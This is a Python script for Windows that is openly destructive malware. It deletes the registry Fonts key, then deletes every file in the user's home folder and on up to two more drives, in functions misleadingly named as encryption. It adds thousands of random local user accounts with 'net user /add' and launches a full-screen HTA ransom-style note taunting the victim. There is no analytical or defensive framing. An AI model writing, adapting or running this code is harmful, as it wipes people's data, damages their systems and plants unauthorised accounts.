import random
import string
import os
import win32api
import getpass

drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]
drive_1 = drives[0]
username = getpass.getuser()
user_c_path = drive_1 + "Users\\" + username + "\\"
cwd = os.getcwd()
list = []
letter = 'abcdefghijklmnopqrstuvwxyz0123456789'  
varie = '''<html><head><title>BSOD</title>
 <hta:application id="oBVC" 
 applicationname="BSOD" 
 version="1.0" 
 maximizebutton="no" 
 minimizebutton="no" 
 sysmenu="no" 
 Caption="no" 
 windowstate="maximize"/> 
 </head><body bgcolor="red" scroll="no"> 
 <font face="Lucida Console" size="4" color="#FFFFFF"> 
 <p>.You computer has been infected by C`LyOn.</p> 
 <p>.</p> 
 <p>.All your data been encrypted.</p> 
 <p>.To recover them, please send your mom to 1600 pennsylvania avenue nw washington dc 20500 using UPS.</p> 
 <p>.If data cant be recovered, you been fxcked real hard lol.</p> 
 <p>.</p> 
 <p>.</p> 
 <p> </p> 
 <p>.For Technical information:</p> 
 <p> </p> 
 <p>.Contact your system administrator or technical support group for further assistance.</p> 
 <p>.</p> 
 <p>.</p> 
 <p>.</p> 
 <p>.</p> 
 <p>.````````````````.oooooo.```````````ooooo``````````````````````.oooooo.```````````````````````````````</p> 
 <p>.```````````````d8P````Y8b```````````888``````````````````````d8P````Y8b``````````````````````````````</p> 
 <p>```````````````888```````````````````888`````````oooo````ooo`888``````888`ooo.`.oo.```````````````````</p> 
 <p>```````````````888```````````````````888```````````88.``.8```888``````888``888P"Y88b``````````````````</p> 
 <p>```````````````888``````````8888888``888````````````88..8````888``````888``888```888``````````````````</p> 
 <p>````````````````88b````ooo```````````888```````o`````888``````88b````d88```888```888``````````````````</p> 
 <p>.````````````````Y8bood8P```````````o888ooooood8`````.8````````Y8bood8P```o888o o888o`````````````````</p> 
 <p>.````````````````````````````````````````````````.o..P````````````````````````````````````````````````</p> 
 <p>.`````````````````````````````````````````````````Y8P`````````````````````````````````````````````````</p> 
 </font> 
 </body></html> '''

os.system('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')

def encrypt_drive_1_files():
    path = user_c_path
    files = []
    for r, d, f in os.walk(path):
        for file in f:
            if '.' in file:
                files.append(os.path.join(r, file))

    for f in files:
        print(f)
        try:
            os.remove(f)
        except:
            print("BRUHH")

encrypt_drive_1_files()

try:
    def encrypt_drive_2_files():
        drive_2 = drives[1]
        path = drive_2
        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if '.' in file:
                    files.append(os.path.join(r, file))

        for f in files:
            print(f)

            try:
                os.remove(f)
            except:
                print("BRUHH")

    encrypt_drive_2_files()

except:
    print(".")

try:
    def encrypt_drive_3_files():
        drive_3 = drives[2]
        path = drive_3
        files = []
        for r, d, f in os.walk(path):
            for file in f:
                if '.' in file:
                    files.append(os.path.join(r, file))

        for f in files:
            print(f)

            try:
                os.remove(f)
            except:
                print("BRUHH")
        

    encrypt_drive_3_files()

except:
    print(".")

for z in range(1, 4096) :
    i = 0
    number = random.randint(5, 5)
    def randStr(chars = string.ascii_uppercase + string.digits, N=number):
        return ''.join(random.choice(chars) for _ in range(N))
    user = randStr(chars=letter)
    password = randStr(chars=letter)
    list.append(user)
    if user in list:
        def create_remote_user():
            command = 'net user /add ' + user + password
            os.system(command)
        create_remote_user()

    

def RSOD():
    file = cwd + 'rsod.hta'
    with open(file, 'wb') as r:
        r.write(varie)
    os.startfile(file)
RSOD()

print ("YOU BEEN FUCKED !!!!")
